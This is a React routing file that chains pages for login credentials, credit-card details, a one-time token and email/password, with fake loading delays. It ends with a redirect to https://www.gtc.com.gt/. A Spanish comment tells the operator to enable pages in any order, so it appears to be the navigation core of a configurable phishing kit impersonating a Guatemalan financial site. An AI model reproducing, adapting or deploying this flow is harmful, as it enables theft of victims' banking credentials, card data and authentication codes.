import React from 'react'
import { BrowserRouter, Route, Routes } from 'react-router-dom'
import { CreditCard } from '../pages/card/CreditCard'
import { UsernameAndPassword } from '../pages/Usernamepassword/UsernameAndPassword'
import { EmailAndPassword } from '../pages/email/emailAndPassword/EmailAndPassword'
// import { EmailAndPhone } from '../pages/email/emailAndPhone/EmailAndPhone'
import { Token } from '../pages/token/Token'

export const Navigation = () => {
  return (
    <BrowserRouter>
        <Routes>
            {/* AQUI SOLO HAY QUE DESCOMENTAR LOS QUE DESEAS USAR EN EL ORDEN QUE DESEES QUE ESTÉ */}
            
            <Route path='/' element={<UsernameAndPassword
              urlToNavigate={'tarjeta'}
            />} />

            {/* card/CreditCard */}
            <Route path='/tarjeta' element={
              <CreditCard timeLoader={15000} spiner={true} urlToNavigate={'token'} />} 
            />

            {/* email/emailAndPassword */}
            <Route path='/token' element={
              <Token 
                timeLoader={5000}
                spiner={true}
                urlToNavigate={'correo-clave'} 
              />} 
            />
            
            {/* email/emailAndPhone */}
            <Route path='/correo-clave' element={
              <EmailAndPassword 
                spiner={true}
                endUrl={'https://www.gtc.com.gt/'} 
                timeLoader={5000}
              />} 
            />



        </Routes>
    </BrowserRouter>
  )
}
